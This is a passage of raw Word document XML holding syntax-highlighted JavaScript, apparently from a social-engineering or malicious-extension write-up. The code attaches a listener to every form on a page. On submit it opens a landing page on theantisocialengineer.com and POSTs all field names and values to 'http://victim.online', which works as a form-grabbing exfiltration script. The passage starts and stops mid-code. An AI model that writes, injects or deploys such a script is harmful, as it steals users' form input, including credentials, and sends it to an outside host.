                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">forms = </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>document.forms</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>//called when a submit event happens</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">function </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>formSubmit</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(event) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    window.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>open</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>'https://theantisocialengineer.com/chrome-extension-landing-page/'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>xhr</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">new </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>XMLHttpRequest</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>()</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>xhr.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>open</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>'POST'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>'http://victim.online'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">string = </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>''</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">// iterate over all of the form fields and </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>urlencode</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> them. There'll be an extra </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2A251BB7" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>&amp; at the end but who cares</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">for </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">index </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">= </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6897BB"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">index </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">&lt; </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>event.target</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>.elements.length</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>++</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>index</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">        string = string + </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>event.target.elements</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>index</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>].</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">name </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">+ </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">'=' </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">+ </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6DF222E4" w14:textId="3147C146" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>event.target.elements</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>index</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>].</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">value </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">+ </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>'&amp;'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>xhr.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>setRequestHeader</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>"Content-type"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>"application/x-www-form-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>urlencoded</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>xhr.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>send</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(string)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>// add an event listener to the submit event for every form in the page</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">for </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">index </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">= </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="6897BB"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">index </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">&lt; </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>forms.length</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>++</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>index</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    forms[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
